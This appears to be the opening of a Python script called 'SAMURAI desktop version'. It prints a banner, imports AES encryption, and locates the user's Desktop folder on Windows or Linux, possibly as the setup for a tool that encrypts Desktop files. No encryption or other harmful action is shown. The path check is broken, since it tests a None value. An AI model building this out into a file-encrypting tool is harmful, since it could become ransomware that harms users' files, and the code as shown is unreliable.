#!/usr/bin/python
#This is official SAMURAI desktop version
import os, random, struct, hashlib
from Crypto.Cipher import AES

SYS_INFO = {"SYSTEM":None, "PATH":None}
LOGIN = os.getlogin()

v1 = "/root/Desktop/"
v2 = None

def print_banner():
	banner = '''
	 __________                                        ____
	 /   _____/_____     _____   __ __ _______ _____   |__|
	 \_____  \ \__  \   /     \ |  |  \\_  __ \\__  \  |  |
	 /        \ / __ \_|  Y Y  \|  |  / |  | \/ / __ \_|  |
	/_______  /(____  /|__|_|  /|____/  |__|   (____  /|__|
        	\/      \/       \/                     \/
			      DESKTOP VERSION
	'''
	print(banner)

def get_system():
	if os.name == "nt":
		SYS_INFO["SYSTEM"]	= "Win"
		SYS_INFO["PATH"]	= "C://Users//" + str(LOGIN) + "//Desktop"
	elif os.name == "posix":
		SYS_INFO["SYSTEM"]	= "Linux"
		if os.path.isdir(v1):
			SYS_INFO["PATH"] = v1
		elif os.path.isdir(v2):
			SYS_INFO["PATH"] = v2
		else:
			print("PATH ERROR")
	else:
		pass
	print(SYS_INFO)
